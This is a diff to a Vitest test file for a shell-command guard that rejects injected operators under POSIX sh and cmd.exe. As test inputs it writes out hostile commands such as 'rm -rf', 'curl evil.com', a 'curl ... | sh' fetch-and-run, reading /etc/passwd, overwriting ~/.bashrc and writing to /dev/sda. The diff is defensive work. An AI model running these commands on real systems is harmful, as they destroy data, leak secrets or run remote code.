@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { validateCommand } from "../../../src/guard/commands.js";
+import { validateCommand, findActiveShellOperator } from "../../../src/guard/commands.js";
 import { GuardError } from "../../../src/guard/paths.js";
 
 const allowedCommands = ["npm", "npx", "node", "git", "tsc", "vitest", "pnpm"];
@@ -80,6 +80,37 @@ describe("validateCommand", () => {
     });
   });
 
+  describe("newline and redirection injection prevention", () => {
+    it("rejects a newline-separated second command", () => {
+      // The reproduced bypass: the old operator regex did not include \n, so
+      // `sh -c` ran the second line.
+      expect(() => validateCommand("npm --version\nrm -rf ~/x", allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand("npm test\r\ncurl evil.com", allowedCommands)).toThrow("shell operator");
+    });
+
+    it("rejects output redirection to a file", () => {
+      expect(() => validateCommand("npm test > ~/.bashrc", allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand("node script.js >> out.log", allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand("npm test < input", allowedCommands)).toThrow("shell operator");
+    });
+
+    it("rejects subshells", () => {
+      expect(() => validateCommand("npm test (echo hi)", allowedCommands)).toThrow("shell operator");
+    });
+
+    it("allows shell metacharacters inside quotes (single command)", () => {
+      // These are legitimate: the metacharacters are quoted arguments to a
+      // single program, not shell composition. The old blunt regex rejected
+      // some of these ($, backtick, &&) even though the shell would not act on
+      // them; the quote-aware scan does not.
+      expect(() => validateCommand("node -e \"console.log('hello')\"", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("node -e \"if (1 > 0) { process.exit(0) }\"", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("node -e \"const x = a && b\"", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("node -e 'a; b; c'", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("vitest run \"tests/**/*.test.ts\"", allowedCommands)).not.toThrow();
+    });
+  });
+
   describe("command substitution injection prevention", () => {
     it("rejects $() command substitution", () => {
       expect(() => validateCommand("node $(cat /etc/passwd)", allowedCommands)).toThrow("shell operator");
@@ -102,6 +133,95 @@ describe("validateCommand", () => {
     it("rejects braced variable expansion", () => {
       expect(() => validateCommand("npm run ${HOME}", allowedCommands)).toThrow("shell operator");
       expect(() => validateCommand("node ${SCRIPT_PATH}", allowedCommands)).toThrow("shell operator");
+    });
+
+    it("rejects substitution and expansion inside double quotes", () => {
+      // POSIX sh performs command substitution and parameter expansion inside
+      // double quotes, so the quote-aware scan must stay active for `$` and
+      // backtick there — only `; & | < > ( )` are literal between "".
+      expect(() => validateCommand('node -e "$(id)"', allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand("node -e \"`id`\"", allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand('node -e "${HOME}"', allowedCommands)).toThrow("shell operator");
+      expect(() => validateCommand('node -e "$(curl -s example.invalid/x | sh)"', allowedCommands))
+        .toThrow("shell operator");
+      expect(() => validateCommand('echo "path is $HOME"', allowedCommands)).toThrow("shell operator");
+    });
+
+    it("allows substitution characters inside single quotes", () => {
+      // Single quotes are wholly literal to sh — nothing expands there.
+      expect(() => validateCommand("node -e 'a; b; $(c)'", allowedCommands)).not.toThrow();
+      expect(() => validateCommand("node -e 'echo `id` ${HOME}'", allowedCommands)).not.toThrow();
+    });
+
+    it("allows a backslash-escaped $ or backtick inside double quotes", () => {
+      // `\$` and `` \` `` are escaped inside double quotes, so sh treats them
+      // as literal — the scanner's escape handling must agree.
+      expect(() => validateCommand('node -e "\\$(id)"', allowedCommands)).not.toThrow();
+      expect(() => validateCommand('node -e "\\`id\\`"', allowedCommands)).not.toThrow();
+    });
+  });
+
+  // Pure-function: the shell kind is injected, so the cmd.exe branch is
+  // exercised on every platform — including the Linux runner that CI uses.
+  describe("cmd.exe shell semantics (shellKind = \"cmd\")", () => {
+    const cmd = (command: string) => () => validateCommand(command, allowedCommands, "cmd");
+    const sh = (command: string) => () => validateCommand(command, allowedCommands, "posix");
+
+    it("rejects an operator a single quote would protect only under sh", () => {
+      // cmd.exe: a single quote is an ordinary character, so the & separates commands.
+      expect(cmd("npm test 'x & echo pwned'")).toThrow("cmd.exe shell operator");
+      expect(cmd("npm test 'x | more'")).toThrow("cmd.exe shell operator");
+      // sh: one quoted argument — must still pass.
+      expect(sh("npm test 'x & echo pwned'")).not.toThrow();
+    });
+
+    it("rejects an operator a backslash-escaped quote would protect only under sh", () => {
+      // cmd.exe: `\"` does not escape — the quote closes the string and & is live.
+      expect(cmd('npm test "foo\\" & echo pwned"')).toThrow("cmd.exe shell operator");
+      expect(sh('npm test "foo\\" & echo pwned"')).not.toThrow();
+    });
+
+    it("rejects redirection and grouping outside double quotes", () => {
+      expect(cmd("npm test > out.txt")).toThrow('">"');
+      expect(cmd("npm test < in.txt")).toThrow('"<"');
+      expect(cmd("npm test (x)")).toThrow('"("');
+    });
+
+    it("rejects the cmd.exe escape character outside double quotes", () => {
+      // `^"` would neutralise the quote this scanner relies on, and `^&` is a
+      // literal & to cmd only because ^ escaped it — either way, refuse.
+      expect(cmd('npm test ^" & echo pwned')).toThrow('"^"');
+    });
+
+    it("rejects %VAR% expansion anywhere, even inside double quotes", () => {
+      // Expansion is cmd's first parsing phase and ignores quotes.
+      expect(cmd("npm test %PATH%")).toThrow('"%"');
+      expect(cmd('npm test "%PATH%"')).toThrow('"%"');
+      // sh: % means nothing.
+      expect(sh("npm test %PATH%")).not.toThrow();
+    });
+
+    it("still rejects a raw newline", () => {
+      expect(cmd("npm --version\nrmdir /s /q x")).toThrow("a newline");
+    });
+
+    it("allows metacharacters inside double quotes, which cmd.exe does protect", () => {
+      expect(cmd('node -e "console.log(1 && 2)"')).not.toThrow();
+      expect(cmd('npm test "a & b | c"')).not.toThrow();
+      expect(cmd('vitest run "src/a b/x.test.ts"')).not.toThrow();
+    });
+
+    it("does not treat sh-only metacharacters as active", () => {
+      // `$`, backtick and `;` mean nothing to cmd.exe — `;` is an argument
+      // delimiter like a space, not a separator.
+      expect(cmd("npm test $HOME")).not.toThrow();
+      expect(cmd("npm test a;b")).not.toThrow();
+      expect(cmd("node -e \"`x`\"")).not.toThrow();
+    });
+
+    it("defaults to the POSIX model when no shell kind is given", () => {
+      expect(findActiveShellOperator("npm test 'x & y'")).toBeNull();
+      expect(findActiveShellOperator("npm test 'x & y'", "cmd")).toBe("&");
     });
   });
 
@@ -135,7 +255,10 @@ describe("validateCommand", () => {
     });
 
     it("rejects /dev/ redirects", () => {
-      expect(() => validateCommand("npm run > /dev/sda", allowedCommands)).toThrow("dangerous pattern");
+      // `>` is now caught as an unquoted shell operator (a redirect) before the
+      // /dev/-specific dangerous pattern runs. Either way it is rejected; the
+      // broader operator rule simply fires first.
+      expect(() => validateCommand("npm run > /dev/sda", allowedCommands)).toThrow("shell operator");
     });
 
     it("rejects dangerous chmod patterns", () => {
@@ -163,11 +286,11 @@ describe("validateCommand", () => {
       expect(() => validateCommand("npm test;id", allowedCommands)).toThrow("shell operator");
     });
 
-    it("handles newlines in command (should reject)", () => {
-      // Newlines could be used for injection in some contexts
-      // The current implementation doesn't specifically block newlines
-      // but they shouldn't appear in normal commands
-      expect(() => validateCommand("npm\ntest", allowedCommands)).not.toThrow(); // depends on implementation
+    it("rejects newlines in a command", () => {
+      // A raw newline is a command separator to `sh -c`. The guard used to let
+      // it through (this test asserted .not.toThrow, contradicting its own
+      // name); it is now rejected — see the newline-injection bypass this fixed.
+      expect(() => validateCommand("npm\ntest", allowedCommands)).toThrow("shell operator");
     });
   });
 
